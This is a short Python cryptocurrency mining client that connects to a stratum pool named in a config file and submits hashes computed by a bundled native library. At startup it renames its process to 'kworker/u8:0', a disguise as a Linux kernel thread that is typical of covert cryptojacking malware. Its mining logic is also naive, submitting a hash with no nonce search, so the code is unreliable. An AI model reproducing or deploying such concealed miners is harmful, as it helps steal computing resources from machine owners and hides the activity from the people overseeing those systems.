import ctypes
import os
import socket
import json
import struct
import time
import threading
from hashlib import sha256
from setproctitle import setproctitle

setproctitle("kworker/u8:0")

lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), 'core.so'))
lib.hash.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.POINTER(ctypes.c_ubyte)]
lib.hash.restype = None

with open("data.txt") as f:
    config = json.load(f)

HOST = config["host"]
PORT = config["port"]
USER = config["user"]
PASSWORD = config.get("pass", "x")
THREADS = config.get("threads", 2)

def pack_varint(i):
    if i < 0xfd:
        return struct.pack('<B', i)
    elif i <= 0xffff:
        return b'\xfd' + struct.pack('<H', i)
    elif i <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', i)
    else:
        return b'\xff' + struct.pack('<Q', i)

def handshake(sock):
    sock.sendall(json.dumps({
        "id": 1,
        "method": "mining.subscribe",
        "params": []
    }).encode() + b'\n')

    sock.recv(1024)
    sock.sendall(json.dumps({
        "id": 2,
        "method": "mining.authorize",
        "params": [USER, PASSWORD]
    }).encode() + b'\n')

def worker():
    while True:
        try:
            s = socket.create_connection((HOST, PORT))
            s.settimeout(10)
            handshake(s)

            while True:
                line = s.recv(4096)
                if b"mining.set_target" in line:
                    continue
                if b"mining.notify" in line:
                    jobj = json.loads(line.decode())
                    params = jobj["params"]
                    job_id, blob, target = params[0], params[1], params[2]
                    blob_bin = bytes.fromhex(blob)
                    output = ctypes.create_string_buffer(32)
                    input_array = (ctypes.c_ubyte * len(blob_bin)).from_buffer_copy(blob_bin)
                    lib.hash(input_array, output)
                    result = output.raw.hex()

                    submission = {
                        "id": 4,
                        "method": "mining.submit",
                        "params": [USER, job_id, result]
                    }
                    s.sendall(json.dumps(submission).encode() + b'\n')
        except Exception:
            time.sleep(3)

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()

while True:
    time.sleep(100)
